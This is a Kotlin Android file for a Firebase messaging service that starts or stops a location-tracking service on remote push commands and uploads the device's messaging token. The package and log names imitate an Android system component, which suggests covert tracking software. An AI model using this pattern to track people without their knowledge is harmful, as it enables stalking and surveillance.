package com.android.system.core.fcm

import android.content.Intent
import android.os.Build
import android.util.Log
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.android.system.core.BuildConfig
import com.android.system.core.location.LocationForegroundService

class MyFirebaseMessagingService : FirebaseMessagingService() {
    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)
        val command = message.data["command"] ?: return
        when (command) {
            "START_TRACKING" -> {
                val intent = Intent(this, LocationForegroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }
                if (BuildConfig.DEBUG) { Log.d(TAG, "Received START_TRACKING") }
            }
            "STOP_TRACKING" -> {
                stopService(Intent(this, LocationForegroundService::class.java))
                if (BuildConfig.DEBUG) { Log.d(TAG, "Received STOP_TRACKING") }
            }
        }
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        val uid = FirebaseAuth.getInstance().currentUser?.uid ?: return
        FirebaseDatabase.getInstance()
            .getReference("devices")
            .child(uid)
            .child("status")
            .child("fcmToken")
            .setValue(token)
            .addOnFailureListener { e ->
                if (BuildConfig.DEBUG) { Log.e(TAG, "Failed to save token: ${e.message}", e) }
            }
    }

    companion object {
        private const val TAG = "SYS_CORE_FCM"
    }
}
